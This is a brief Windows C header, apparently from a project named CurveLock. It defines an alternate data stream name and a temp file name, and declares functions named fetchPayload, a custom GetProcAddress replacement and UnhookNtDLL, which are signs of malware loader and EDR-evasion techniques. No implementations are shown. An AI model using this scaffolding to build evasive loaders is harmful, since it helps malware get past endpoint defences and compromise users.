#pragma once

#include <Windows.h>

// Definitions
#define NEW_STREAM L":CurveLockRandomStream"
#define TMPFILE	L"CurveLock.tmp"


//Function protortypes
int fetchPayload();
FARPROC GetProcAddressQ(IN HMODULE hModule, IN LPCSTR lpApiName);
BOOL UnhookNtDLL();